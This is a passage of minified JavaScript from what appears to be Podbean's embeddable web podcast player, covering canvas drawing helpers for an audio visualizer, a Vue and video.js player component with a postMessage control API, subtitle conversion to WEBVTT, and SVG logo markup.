        if ("min" === e) {
          var y = [];
          return t.forEach(function (t) {
            t < a && (t = a), y.push(t);
          }), y;
        }
      },
      getPoints: function (t, e, a, o, n) {
        var r = Object(R["a"])(a, 2),
          s = r[0],
          i = r[1],
          c = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : {},
          l = c.offset,
          d = void 0 === l ? 0 : l,
          p = c.rotate,
          u = void 0 === p ? 0 : p,
          h = c.customOrigin,
          f = void 0 === h ? [] : h,
          m = {
            start: [],
            end: []
          };
        if ("circle" === t) {
          for (var g = 360 / o, v = this.__toRadians__(g), w = e / 2, b = 1; b <= o; b++) {
            var y = v * b,
              k = n[b - 1],
              C = n[b - 1] * (d / 100),
              _ = s + (w - C) * Math.cos(y),
              x = i + (w - C) * Math.sin(y),
              P = this.__rotatePoint__([_, x], [s, i], u);
            m.start.push(P), _ = s + (w - C + k) * Math.cos(y), x = i + (w - C + k) * Math.sin(y);
            var S = this.__rotatePoint__([_, x], [s, i], u);
            m.end.push(S);
          }
          return m;
        }
        if ("line" === t) {
          var O = e / o;
          s = f[0] || s, i = f[1] || i;
          for (var E = 0; E <= o; E++) {
            var T = u,
              j = n[E] * (d / 100),
              L = this.__rotatePoint__([s + E * O, i - j], [s, i], T);
            m.start.push(L);
            var A = this.__rotatePoint__([s + E * O, i + n[E] - j], [s, i], T);
            m.end.push(A);
          }
          return m;
        }
      },
      drawCircle: function (t, e) {
        var a = Object(R["a"])(t, 2),
          o = a[0],
          n = a[1],
          r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
          s = r.color,
          i = r.lineColor,
          c = void 0 === i ? this.ctx.strokeStyle : i;
        this.ctx.beginPath(), this.ctx.arc(o, n, e / 2, 0, 2 * Math.PI), this.ctx.strokeStyle = c, this.ctx.stroke(), this.ctx.fillStyle = s, s && this.ctx.fill();
      },
      drawOval: function (t, e, a) {
        var o = Object(R["a"])(t, 2),
          n = o[0],
          r = o[1],
          s = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {},
          i = s.rotation,
          c = void 0 === i ? 0 : i,
          l = s.color,
          d = s.lineColor,
          p = void 0 === d ? this.ctx.strokeStyle : d;
        c && (c = this.__toRadians__(c)), this.ctx.beginPath(), this.ctx.ellipse(n, r, a, e, c, 0, 2 * Math.PI), this.ctx.strokeStyle = p, this.ctx.stroke(), this.ctx.fillStyle = l, l && this.ctx.fill();
      },
      drawSquare: function (t, e) {
        var a = Object(R["a"])(t, 2),
          o = a[0],
          n = a[1],
          r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
        this.drawRectangle([o, n], e, e, r);
      },
      drawRectangle: function (t, e, a) {
        var o = Object(R["a"])(t, 2),
          n = o[0],
          r = o[1],
          s = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {},
          i = s.color,
          c = s.lineColor,
          l = void 0 === c ? this.ctx.strokeStyle : c,
          d = s.radius,
          p = void 0 === d ? 0 : d,
          u = s.rotate,
          h = void 0 === u ? 0 : u;
        this.ctx.beginPath(), this.ctx.moveTo(n + p, r);
        var f = this.__rotatePoint__([n + a, r], [n, r], h),
          m = this.__rotatePoint__([n + a, r + e], [n, r], h);
        this.ctx.arcTo(f[0], f[1], m[0], m[1], p);
        var g = this.__rotatePoint__([n + a, r + e], [n, r], h),
          v = this.__rotatePoint__([n, r + e], [n, r], h);
        this.ctx.arcTo(g[0], g[1], v[0], v[1], p);
        var w = this.__rotatePoint__([n, r + e], [n, r], h),
          b = this.__rotatePoint__([n, r], [n, r], h);
        this.ctx.arcTo(w[0], w[1], b[0], b[1], p);
        var y = this.__rotatePoint__([n, r], [n, r], h),
          k = this.__rotatePoint__([n + a, r], [n, r], h);
        this.ctx.arcTo(y[0], y[1], k[0], k[1], p), this.ctx.closePath(), this.ctx.strokeStyle = l, this.ctx.stroke(), this.ctx.fillStyle = i, i && this.ctx.fill();
      },
      drawLine: function (t, e) {
        var a = Object(R["a"])(t, 2),
          o = a[0],
          n = a[1],
          r = Object(R["a"])(e, 2),
          s = r[0],
          i = r[1],
          c = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
          l = c.lineColor,
          d = void 0 === l ? this.ctx.strokeStyle : l;
        this.ctx.beginPath(), this.ctx.moveTo(o, n), this.ctx.lineTo(s, i), this.ctx.strokeStyle = d, this.ctx.stroke();
      },
      drawPolygon: function (t) {
        var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
          a = e.color,
          o = e.lineColor,
          n = void 0 === o ? this.ctx.strokeStyle : o,
          r = e.radius,
          s = void 0 === r ? 0 : r,
          i = e.close,
          c = void 0 !== i && i;
        function l(t, e, a, o, n, r) {
          var s = Math.sqrt(Math.pow(a - t, 2) + Math.pow(o - e, 2)),
            i = r ? n / s : (s - n) / s;
          return [t + i * (a - t), e + i * (o - e)];
        }
        function d(t, e) {
          for (var a = t.length, o = new Array(a), n = 0; n < a; n++) {
            var r = n - 1,
              s = n + 1;
            r < 0 && (r = a - 1), s == a && (s = 0);
            var i = t[r],
              c = t[n],
              d = t[s],
              p = l(i[0], i[1], c[0], c[1], e, !1),
              u = l(c[0], c[1], d[0], d[1], e, !0);
            o[n] = [p[0], p[1], c[0], c[1], u[0], u[1]];
          }
          return o;
        }
        s > 0 && (t = d(t, s));
        var p,
          u,
          h = t.length;
        for (p = 0; p < h; p++) u = t[p], 0 == p ? (this.ctx.beginPath(), this.ctx.moveTo(u[0], u[1])) : this.ctx.lineTo(u[0], u[1]), s > 0 && this.ctx.quadraticCurveTo(u[2], u[3], u[4], u[5]);
        c && this.ctx.closePath(), this.ctx.strokeStyle = n, this.ctx.stroke(), this.ctx.fillStyle = a, a && this.ctx.fill();
      }
    };
    var kt = yt;
    function Ct() {
      this.current_stream = {}, this.sources = {}, this.onFileLoad = null, this.activeElements = {}, this.activated = !1, window.AudioContext = window.AudioContext || window.webkitAudioContext;
    }
    Ct.prototype = Object(i["a"])(Object(i["a"])({
      fromElement: S,
      fromFile: O
    }, L), {}, {
      visualize: vt,
      Helper: kt
    });
    var _t,
      xt = Ct,
      Pt = a("f576"),
      St = a.n(Pt);
    function Ot(t) {
      var e = new URLSearchParams(window.location.search);
      return e.get(t);
    }
    function Et(t) {
      return Tt.apply(this, arguments);
    }
    function Tt() {
      return Tt = Object(s["a"])(regeneratorRuntime.mark(function t(e) {
        return regeneratorRuntime.wrap(function (t) {
          while (1) switch (t.prev = t.next) {
            case 0:
              return t.abrupt("return", new Promise(function (t) {
                setTimeout(t, e);
              }));
            case 1:
            case "end":
              return t.stop();
          }
        }, t);
      })), Tt.apply(this, arguments);
    }
    function jt() {
      return Lt.apply(this, arguments);
    }
    function Lt() {
      return Lt = Object(s["a"])(regeneratorRuntime.mark(function t() {
        var e, a;
        return regeneratorRuntime.wrap(function (t) {
          while (1) switch (t.prev = t.next) {
            case 0:
              e = new xt(), a = "bars", e.fromElement("vvvv_html5_api", "wave-canvas", {
                type: a
              });
            case 3:
            case "end":
              return t.stop();
          }
        }, t);
      })), Lt.apply(this, arguments);
    }
    function At(t, e) {
      window.parent.postMessage({
        event: "PB.Widget.API.CALLBACK." + t,
        data: e
      }, "*");
    }
    function Dt(t, e) {
      window.parent && window.parent !== window && window.parent.postMessage({
        event: t,
        data: e
      }, "*");
    }
    function Mt() {
      var t = function () {
        return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1);
      };
      return t() + t() + "-" + t() + "-" + t() + "-" + t() + "-" + t() + t() + t();
    }
    function Rt(t) {
      var e = document.createElement("link");
      e.href = t, e.rel = "stylesheet", e.type = "text/css", document.head.appendChild(e);
    }
    function $t(t) {
      var e = t.replace(/\r+/g, "");
      e = e.replace(/^\s+|\s+$/g, "");
      var a = e.split("\n\n"),
        o = "";
      if (a.length > 0) {
        o += "WEBVTT\n\n";
        for (var n = 0; n < a.length; n += 1) o += It(a[n]);
      }
      return o;
    }
    function It(t) {
      var e = "",
        a = t.split(/\n/);
      while (a.length > 3) {
        for (var o = 3; o < a.length; o++) a[2] += "\n" + a[o];
        a.splice(3, a.length - 3);
      }
      var n = 0;
      if (!a[0].match(/\d+:\d+:\d+/) && a[1].match(/\d+:\d+:\d+/) && (e += a[0].match(/\w+/) + "\n", n += 1), !a[n].match(/\d+:\d+:\d+/)) return "";
      var r = a[1].match(/(\d+):(\d+):(\d+)(?:,(\d+))?\s*--?>\s*(\d+):(\d+):(\d+)(?:,(\d+))?/);
      return r ? (e += r[1] + ":" + r[2] + ":" + r[3] + "." + r[4] + " --\x3e " + r[5] + ":" + r[6] + ":" + r[7] + "." + r[8] + "\n", n += 1, a[n] && (e += a[n] + "\n\n"), e) : "";
    }
    function Bt(t, e) {
      document.title = t + " > " + e;
    }
    function zt(t) {
      var e = t.replace(/\?.*/, "").replace(/.*\//, "").replace(/.*\./, "").toLowerCase(),
        a = {
          mid: "audio/midi",
          midi: "audio/midi",
          kar: "audio/midi",
          mp3: "audio/mpeg",
          ogg: "audio/ogg",
          m4a: "audio/x-m4a",
          ra: "audio/x-realaudio",
          "3gpp": "video/3gpp",
          "3gp": "video/3gpp",
          ts: "video/mp2t",
          mp4: "video/mp4",
          mpeg: "video/mpeg",
          mpg: "video/mpeg",
          mov: "video/quicktime",
          webm: "video/webm",
          flv: "video/x-flv",
          m4v: "video/x-m4v",
          mng: "video/x-mng",
          asx: "video/x-ms-asf",
          asf: "video/x-ms-asf",
          wmv: "video/x-ms-wmv",
          avi: "video/x-msvideo"
        };
      return a[e];
    }
    function qt(t) {
      return new St.a().update(t).digest("hex");
    }
    function Ht(t, e) {
      e = e || 2;
      var a = new Array(e).join("0");
      return (a + t).slice(-e);
    }
    function Nt(t, e) {
      if (0 === t.indexOf("#") && (t = t.slice(1)), 3 === t.length && (t = t[0] + t[0] + t[1] + t[1] + t[2] + t[2]), 6 !== t.length) throw new Error("Invalid HEX color.");
      var a = parseInt(t.slice(0, 2), 16),
        o = parseInt(t.slice(2, 4), 16),
        n = parseInt(t.slice(4, 6), 16);
      return e ? .299 * a + .587 * o + .114 * n > 186 ? "#000000" : "#FFFFFF" : (a = (255 - a).toString(16), o = (255 - o).toString(16), n = (255 - n).toString(16), "#" + Ht(a) + Ht(o) + Ht(n));
    }
    function Ut(t, e) {
      return t ? "#auto" !== t && "auto" !== t || (t = e ? Nt(e, !0) : null) : e && (t = Nt(e, !0)), t = t && -1 === t.indexOf("#") ? "#" + t : t, t;
    }
    function Ft() {
      return !!window.ActiveXObject || "ActiveXObject" in window;
    }
    function Vt(t) {
      var e = 600,
        a = 600,
        o = (window.screen.availHeight - 30 - a) / 2,
        n = (window.screen.availWidth - 10 - e) / 2;
      window.open(t, "connect_window", "height=" + e + ",width=" + a + ",top=" + o + ",left=" + n + ",toolbar=no,menubar=no,scrollbars=no, resizable=no,location=no, status=no");
    }
    function Wt(t) {
      if (null === t) return null;
      var e = Math.floor(t / 3600),
        a = Math.floor(t % 3600 / 60);
      return t = Math.floor(t % 3600 % 60), a < 10 && (a = "0".concat(a)), t < 10 && (t = "0".concat(t)), e > 0 ? (e < 10 && (e = "0".concat(e)), "".concat(e, ":").concat(a, ":").concat(t)) : "00:".concat(a, ":").concat(t);
    }
    var Gt = w["a"].extend(w["a"].getComponent("Component"));
    Gt.prototype.createEl = function () {
      return this.options_.dom;
    }, w["a"].registerComponent("DomRef", Gt), w["a"].addLanguage("en", {
      "The media could not be loaded, either because the server or network failed or because the format is not supported.": "Error opening file. "
    });
    var Kt = {
        name: "PbPlayer",
        props: {
          options: {
            type: Object,
            default: function () {
              return {};
            }
          },
          episode: Object,
          startAt: Number,
          type: String,
          crossorigin: String
        },
        watch: (_t = {}, Object(m["a"])(_t, "options.sources", function (t) {
          this.player.src(t), this.player.play(), this.engagementStart = null, this.engagementEnd = null, this.retry = 1;
        }), Object(m["a"])(_t, "start", function () {
          this.player.play();
        }), Object(m["a"])(_t, "stop", function () {
          this.player.pause();
        }), Object(m["a"])(_t, "playbackRate", function (t) {
          this.player && this.player.playbackRate(t);
        }), Object(m["a"])(_t, "episode", function (t) {
          this.initEpisode(t);
        }), _t),
        computed: Object(i["a"])(Object(i["a"])({}, Object(d["c"])(["setting", "episodes", "current", "start", "stop", "playbackRate"])), {}, {
          isFuture: function () {
            return "future episode" == this.episode.resource;
          }
        }),
        data: function () {
          return {
            player: null,
            startAtFix: !1,
            initFFT: !1,
            analyser: null,
            engagementStart: null,
            engagementEnd: null,
            t: 0,
            retry: 1
          };
        },
        mounted: function () {
          var t = this;
          this.player = Object(w["a"])(this.$refs.vjsPlayer, this.options, Object(s["a"])(regeneratorRuntime.mark(function e() {
            var a;
            return regeneratorRuntime.wrap(function (e) {
              while (1) switch (e.prev = e.next) {
                case 0:
                  a = new v.a.VideoJSAdapter(t.player), t.postEvent("PB.Widget.Events.READY"), t.$emit("ready"), t.initEpisode(t.episode), a.ready();
                case 5:
                case "end":
                  return e.stop();
              }
            }, e);
          }))), this.$store.commit(b, ["playerError", !1]), "mediaSession" in navigator && (navigator.mediaSession.setActionHandler("seekbackward", function () {
            t.addCurrentTime(-15);
          }), navigator.mediaSession.setActionHandler("seekforward", function () {
            t.addCurrentTime(15);
          })), this.player.on("timeupdate", this.timeupdate), this.player.on("progress", this.progress), this.player.on("playing", this.playing), this.player.on("ended", this.ended), this.player.on("seeked", this.seeked), this.player.on("loadeddata", this.loadeddata), this.player.on("waiting", this.waiting), this.player.on("error", this.error), this.player.on("pause", this.pause), this.player.on("play", this.play), this.player.on("useractive", this.useractive), this.player.on("userinactive", this.userinactive), window.addEventListener("beforeunload", function () {
            t.pushStats();
          }), this.apiEventListener();
        },
        beforeDestroy: function () {
          this.player && (this.player.dispose(), this.player = null);
        },
        methods: {
          initEpisode: function (t) {
            var e = this;
            return Object(s["a"])(regeneratorRuntime.mark(function a() {
              var o, n, r, s, i;
              return regeneratorRuntime.wrap(function (a) {
                while (1) switch (a.prev = a.next) {
                  case 0:
                    t && t.title && Bt(t.title, e.$store.state.setting.podcastTitle), o = e.player.remoteTextTracks().tracks_, n = Object(f["a"])(o);
                    try {
                      for (n.s(); !(r = n.n()).done;) s = r.value, e.player.removeRemoteTextTrack(s);
                    } catch (c) {
                      n.e(c);
                    } finally {
                      n.f();
                    }
                    if (!t.transcripts_url) {
                      a.next = 9;
                      break;
                    }
                    return a.next = 7, N(t.transcripts_url);
                  case 7:
                    i = a.sent, i && e.player.addRemoteTextTrack({
                      src: i,
                      srclang: "en",
                      label: "english",
                      kind: "subtitles",
                      default: !0
                    }, !0);
                  case 9:
                  case "end":
                    return a.stop();
                }
              }, a);
            }))();
          },
          loadeddata: function () {
            this.startAtFix || (this.startAt > 0 && this.player.currentTime(this.startAt), this.startAtFix = !0);
          },
          addCurrentTime: function (t) {
            this.player && this.player.currentTime(this.currentTime() + t);
          },
          setCurrentTime: function (t) {
            if (this.player) {
              var e = this.player.duration();
              t > e ? this.player.pause() : (this.player.currentTime(t), this.player.play());
            }
          },
          postEvent: function (t) {
            var e = this.player.buffered(),
              a = this.player.duration(),
              o = {};
            o.currentPosition = this.currentTime(), a > 0 ? (o.loadedProgress = e.end(e.length - 1) / a, o.relativePosition = o.currentPosition / a) : (o.relativePosition = 0, o.loadedProgress = 0), Dt(t, o);
          },
          pushStats: function () {
            H(this.episode.id, this.engagementStart, this.engagementEnd), this.engagementStart = this.engagementEnd;
          },
          currentTime: function () {
            return this.player ? this.player.currentTime() : 0;
          },
          timeupdate: function () {
            this.player && !this.player.ended() && (null === this.engagementStart && (this.engagementStart = this.currentTime()), null === this.engagementEnd && (this.engagementEnd = this.currentTime()), Math.abs(this.currentTime() - this.engagementEnd) > 1 && (this.pushStats(), this.engagementStart = this.currentTime()), this.engagementEnd = this.currentTime(), this.postEvent("PB.Widget.Events.PLAY_PROGRESS"));
          },
          progress: function () {
            this.postEvent("PB.Widget.Events.LOAD_PROGRESS");
          },
          playing: function () {
            this.postEvent("PB.Widget.Events.PLAY"), this.$store.commit(b, ["playerLoading", !1]), this.$store.commit(b, ["playerPlaying", !0]), this.$store.commit(b, ["playerLoaded", !0]);
          },
          play: function () {
            this.$emit("play"), this.player.playbackRate(this.playbackRate), this.$store.commit(b, ["playing", !0]);
          },
          pause: function (t) {
            this.$store.commit(b, ["playerPlaying", !1]), this.pushStats(), this.$emit("pause", t), this.postEvent("PB.Widget.Events.PAUSE"), this.showPBAppAd(), this.$store.commit(b, ["playing", !1]);
          },
          showPBAppAd: function () {
            this.setting.pbad && "private" !== this.setting.podcastProtectedType && 0 === this.$store.state.showAppDownloadStatus && (this.player.error_ || this.player.scrubbing() || this.player.seeking() || this.player.ended() && this.$store.state.episodes.length > 1 || this.$store.commit(b, ["showAppDownloadStatus", 1]));
          },
          showFutureWarning: function () {
            this.$toasted.show("Episode Available after " + this.episode.publishTime, {
              position: "top-center",
              duration: 2e3
            });
          },
          ended: function () {
            var t = this;
            return Object(s["a"])(regeneratorRuntime.mark(function e() {
              return regeneratorRuntime.wrap(function (e) {
                while (1) switch (e.prev = e.next) {
                  case 0:
                    if (t.pushStats(), t.postEvent("PB.Widget.Events.FINISH"), !(t.$store.state.episodes.length > 1)) {
                      e.next = 9;
                      break;
                    }
                    return t.$store.dispatch(C), e.next = 6, Et(500);
                  case 6:
                    0 == t.$store.state.current && t.$store.commit(b, ["start", t.$store.state.start + 1]), e.next = 10;
                    break;
                  case 9:
                    t.showPBAppAd();
                  case 10:
                  case "end":
                    return e.stop();
                }
              }, e);
            }))();
          },
          seeked: function () {
            this.postEvent("PB.Widget.Events.SEEK");
          },
          apiEventListener: function () {
            var t = this,
              e = this.player;
            window.addEventListener("message", function (a) {
              if ("object" === Object(h["a"])(a.data) && a.data.action && -1 !== a.data.action.search("PB.Widget.API.")) try {
                var o = a.data.action.replace("PB.Widget.API.", "");
                switch (o) {
                  case "PLAY":
                    e.play();
                    break;
                  case "PAUSE":
                    e.pause();
                    break;
                  case "NEXT":
                    t.$store.dispatch(C);
                    break;
                  case "PREV":
                    t.$store.dispatch(_);
                    break;
                  case "TOGGLE":
                    e.paused() ? e.play() : e.pause();
                    break;
                  case "SEEK_TO":
                    e.currentTime(a.data.value);
                    break;
                  case "SET_VOLUME":
                    e.volume(a.data.value / 100);
                    break;
                  case "SKIP":
                    var n = parseInt(a.data.value);
                    n > 0 && n < t.$store.state.episodes.length && t.$store.commit(b, ["current", n]);
                    break;
                  case "GET_VOLUME":
                    At(o, 100 * e.volume());
                    break;
                  case "GET_DURATION":
                    At(o, e.duration());
                    break;
                  case "GET_POSITION":
                    At(o, e.currentTime());
                    break;
                  case "GET_PAUSED":
                    At(o, e.paused());
                    break;
                  case "GET_SOURCES":
                    At(o, t.$store.state.episodes.map(function (t) {
                      return t.resource;
                    }));
                    break;
                  case "GET_CURRENTSOURCE":
                    At(o, e.currentSrc());
                    break;
                  case "GET_CURRENTSOURCEINDEX":
                    At(o, t.$store.state.current);
                    break;
                }
              } catch (r) {}
            });
          },
          useractive: function () {
            this.$emit("useractive");
          },
          userinactive: function () {
            this.$emit("userinactive");
          },
          error: function () {
            if (this.retry > 0 && this.episode.fallbackResource) return this.retry--, this.player.src({
              src: this.episode.fallbackResource,
              type: this.episode.fallbackResourceMimetype
            }), !1;
            this.$store.commit(b, ["playerError", !0]), this.$store.commit(b, ["playerLoading", !1]);
          },
          waiting: function () {
            this.$store.commit(b, ["playerLoading", !0]);
          }
        }
      },
      Jt = Kt,
      Xt = (a("4e34"), a("2877")),
      Yt = Object(Xt["a"])(Jt, p, u, !1, null, "66916b30", null),
      Qt = Yt.exports,
      Zt = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "download-dialog common-dialog"
        }, [a("div", {
          staticClass: "dialog-content"
        }, [a("p", {
          staticClass: "text"
        }, [t._v("Play the podcast on Podbean")]), a("p", {
          staticClass: "title"
        }, [t._v(t._s(t.setting.podcastTitle))]), a("div", {
          staticClass: "app-download"
        }, [a("a", {
          staticClass: "download-app-btn",
          attrs: {
            href: t.episode.playStopShareLink,
            target: "_blank"
          }
        }, [a("icon-small-podbean-logo"), a("span", {
          staticClass: "line"
        }), t._m(0)], 1)])]), t.setting.pbad ? a("a", {
          staticClass: "podbean-logo",
          attrs: {
            target: "_blank",
            href: "http://www.podbean.com?utm_campaign=pb_web_audio_player&utm_medium=app_download&utm_source=pb_web_player"
          }
        }, [a("icon-podbean-logo")], 1) : t._e(), a("button", {
          staticClass: "close",
          on: {
            click: t.close
          }
        }, [a("icon-close")], 1)]);
      },
      te = [function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("span", {
          staticClass: "btn-text"
        }, [t._v("Listen on "), a("br"), t._v(" Podbean app")]);
      }],
      ee = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "bi bi-x-circle",
          attrs: {
            xmlns: "http://www.w3.org/2000/svg",
            width: "16",
            height: "16",
            fill: "currentColor",
            viewBox: "0 0 16 16"
          }
        }, [a("path", {
          attrs: {
            d: "M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"
          }
        }), a("path", {
          attrs: {
            d: "M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708z"
          }
        })]);
      },
      ae = [],
      oe = {
        name: "icon-close"
      },
      ne = oe,
      re = Object(Xt["a"])(ne, ee, ae, !1, null, null, null),
      se = re.exports,
      ie = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "icon-podbean-logo",
          attrs: {
            version: "1.1",
            xmlns: "http://www.w3.org/2000/svg",
            "xmlns:xlink": "http://www.w3.org/1999/xlink",
            x: "0px",
            y: "0px",
            viewBox: "0 0 1366 458",
            "xml:space": "preserve",
            fill: "currentColor"
          }
        }, [a("path", {
          attrs: {
            d: "M378.2,286.5c-17.6-17.6-41.1-27.3-66-27.3c-51.4,0-93.3,41.9-93.3,93.3s41.9,93.3,93.3,93.3\n\tc24.9,0,48.3-9.7,66-27.3c17.6-17.6,27.3-41.1,27.3-66C405.5,327.6,395.8,304.1,378.2,286.5z M312.2,401.5c-27,0-49-22-49-49\n\tc0-27,22-49,49-49c27,0,49,22,49,49C361.2,379.5,339.2,401.5,312.2,401.5z"
          }
        }), a("path", {
          attrs: {
            d: "M192.4,231.4c-5.2,0-10.5-1.4-15.2-4.4c-13-8.2-16.7-25.1-8.3-37.8c15.3-23,36.4-42.2,61-55.5\n\tc25.4-13.8,54.3-21,83.5-21c46,0,89.2,17.4,121.8,49.1c8.6,8.4,16.3,17.6,22.9,27.5c8.4,12.7,4.7,29.6-8.3,37.8\n\tc-13,8.2-30.4,4.6-38.8-8c-4.5-6.7-9.7-12.9-15.5-18.6c-21.9-21.3-51.1-33.1-82.1-33.1c-39.4,0-75.9,19.3-97.5,51.7\n\tC210.6,227,201.6,231.4,192.4,231.4z"
          }
        }), a("path", {
          attrs: {
            d: "M526.5,182.3c-9.2,0-18.2-4.4-23.6-12.4c-8.4-12.6-18.2-24.3-29.2-35c-41.4-40.1-96.4-62.2-155-62.2\n\tc-74.5,0-143.3,36.3-184,97.2c-5.4,8-14.4,12.4-23.6,12.4c-5.2,0-10.5-1.4-15.2-4.4c-13-8.2-16.7-25-8.3-37.6\n\tc24.5-36.7,58.3-67.3,97.6-88.5c40.6-21.9,86.8-33.5,133.5-33.5c73.5,0,142.7,27.8,194.7,78.2c13.8,13.3,26.1,28.1,36.6,43.8\n\tc8.4,12.6,4.7,29.5-8.3,37.6C537.1,180.9,531.8,182.3,526.5,182.3z"
          }
        }), a("g", [a("path", {
          attrs: {
            d: "M12,443V211h75.4c28.5,0,47.1,1.2,55.9,3.5c13.3,3.5,24.5,11.2,33.5,22.8c9,11.7,13.5,26.8,13.5,45.2\n\t\tc0,14.3-2.6,26.4-7.8,36.1c-5.2,9.8-11.8,17.4-19.8,22.9c-8.1,5.5-16.2,9.2-24.3,11c-11.2,2.2-27.5,3.3-48.8,3.3H59v87H12z M59,250\n\t\tv66h25.7c18.5,0,30.8-1.2,37-3.7c6.2-2.4,11.1-6.2,14.6-11.4c3.5-5.2,5.3-11.2,5.3-18.2c0-8.4-2.5-15.4-7.4-20.9\n\t\tc-4.9-5.5-11.2-9-18.7-10.3c-5.6-1-16.9-1.6-33.9-1.6H59z"
          }
        }), a("path", {
          attrs: {
            d: "M608,443h-42v-24.7c-6.8,9.6-14.9,16.7-24.3,21.5c-9.4,4.7-18.8,7.1-28.2,7.1c-19.3,0-35.9-7.8-49.7-23.4\n\t\tc-13.8-15.6-20.7-37.3-20.7-65.2c0-28.5,6.7-50.2,20.1-65.1c13.4-14.9,30.4-22.4,50.9-22.4c18.7,0,48.8,23.5,48.8,23.5V211h45V443z\n\t\tM488.7,355.3c0,18,2.4,31,7.3,39c7.2,11.7,17.3,17.5,30.1,17.5c10.3,0,19.1-4.4,26.2-13.1c7.2-8.7,10.7-21.7,10.7-39\n\t\tc0-19.3-3.5-33.3-10.4-41.8c-6.9-8.6-15.9-12.8-26.8-12.8c-10.6,0-19.5,4.2-26.6,12.6C492.2,326,488.7,338.6,488.7,355.3z"
          }
        }), a("path", {
          attrs: {
            d: "M640,211h92.8c18.4,0,32.1,0.8,41.1,2.3c9,1.5,17,4.8,24.2,9.6c7.1,4.9,13.1,11.3,17.8,19.4\n\t\tc4.7,8.1,7.1,17.2,7.1,27.2c0,10.8-2.9,20.7-8.7,29.7c-5.8,9.1-13.7,15.9-23.8,20.4c14.1,4.1,25,11.2,32.6,21.1\n\t\tc7.6,9.9,11.4,21.6,11.4,35c0,10.5-2.5,20.7-7.4,30.7c-4.9,10-11.6,18-20.1,24c-8.5,6-19,9.6-31.5,10.9c-7.8,0.9-26.6,1.4-56.3,1.5\n\t\tH640V211z M687,249v54h30.9c18.4,0,29.8-0.3,34.2-0.9c8.1-0.9,14.5-3.7,19.1-8.3c4.6-4.7,6.9-10.7,6.9-18.1c0-7.3-2-13.1-6-17.7\n\t\tc-4-4.5-9.9-7.2-17.8-8.1c-4.6-0.6-18-0.9-40.2-0.9H687z M687,342v62h43.5c16.8,0,27.4-0.4,32-1.3c6.9-1.3,12.6-4.4,17-9.3\n\t\tc4.4-4.9,6.6-11.4,6.6-19.6c0-7.1-1.7-13-5.1-17.8c-3.4-4.8-8.3-8.3-14.7-10.6c-6.4-2.3-20.3-3.4-41.6-3.4H687z"
          }
        }), a("path", {
          attrs: {
            d: "M960.7,389.7l44.3,7.5c-5.8,16.2-14.8,28.6-27,37.1c-12.2,8.5-27.7,12.7-46.3,12.7c-29.2,0-50.8-9.5-64.9-28.6\n\t\tc-11.1-15.3-16.6-34.7-16.6-58c0-27.9,7.3-49.8,21.8-65.6c14.5-15.9,32.9-23.8,55.2-23.8c25.1,0,44.8,8.3,59.1,24.9\n\t\tc14.3,16.6,21.5,41.9,21.5,76h-112c0.3,13.1,3.9,23.4,10.7,30.8c6.9,7.4,15.4,11.1,25.6,11.1c7.1,0,13-1.9,17.7-5.8\n\t\tC954.6,404.2,958.2,398.1,960.7,389.7z M963.2,345c-0.3-13-3.6-22.8-10-29.5c-6.3-6.7-14.1-10.1-23.2-10.1\n\t\tc-9.6,0-17.6,3.5-23.9,10.6c-6.3,7.1-9.5,16.7-9.5,29H963.2z"
          }
        }), a("path", {
          attrs: {
            d: "M1064.9,326.1l-40.9-7.3c4.6-16.4,12.5-28.5,23.7-36.3c11.2-7.8,27.8-11.7,49.8-11.7c20.1,0,35.1,2.4,44.9,7.1\n\t\tc9.8,4.7,16.7,10.7,20.7,17.9c3.9,7.2,5.9,20.5,5.9,39.8l-0.4,52c0,14.8,0.7,25.7,2.2,32.8c1.5,7.1,4.2,14.6,8,22.6h-44.4\n\t\tc-1.2-2.9-2.6-7.3-4.2-13.1c-0.7-2.7-1.3-4.4-1.6-5.3c-7.7,7.4-16,12.9-24.7,16.6c-8.7,3.7-18.1,5.5-28,5.5\n\t\tc-17.4,0-31.2-4.7-41.3-14.1c-10.1-9.4-15.2-21.3-15.2-35.7c0-9.4,2.3-17.9,6.9-25.3c4.6-7.4,11.1-13.2,19.3-17.2\n\t\tc8.3-4,20.1-7.4,35.6-10.4c21-3.8,35.6-7.4,43.8-10.8v-4.4c0-8.6-2.1-14.7-6.4-18.4c-4.2-3.7-12.3-5.5-24.2-5.5\n\t\tc-8,0-14.3,1.6-18.8,4.8C1071.2,312.8,1067.6,318.3,1064.9,326.1z M1125,362.3c-5.8,1.9-14.8,4.2-27.1,6.9\n\t\tc-12.3,2.7-20.4,5.2-24.2,7.7c-5.9,4.1-8.9,9.4-8.9,15.7c0,6.2,2.3,11.5,7,16c4.6,4.5,10.6,6.8,17.8,6.8c8.1,0,15.8-2.6,23-7.7\n\t\tc5.3-4.1,8.9-9.1,10.6-14.8c1.2-3.8,1.8-11.1,1.8-21.7V362.3z"
          }
        }), a("path", {
          attrs: {
